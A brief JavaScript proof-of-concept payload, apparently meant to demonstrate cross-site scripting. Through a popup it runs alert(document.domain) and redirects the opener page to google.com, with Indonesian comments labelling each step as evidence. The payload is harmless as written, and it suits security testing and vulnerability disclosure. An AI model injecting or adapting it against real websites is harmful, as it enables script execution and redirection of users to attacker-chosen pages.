(function() {
    try {
        const newWin = window.open('', '_blank', 'width=200,height=100');
        if (!newWin) { return; }

        newWin.document.write(`
            <html>
            <script>
                // Bukti eksekusi kode
                alert(document.domain);
                
                // Bukti pengalihan halaman induk
                if (window.opener && window.opener.top) {
                    window.opener.top.location.href = 'https://www.google.com'; 
                }
            <\/script>
            </html>
        `);
        newWin.document.close(); 
    } catch (e) {
        console.error(e);
    }
})();
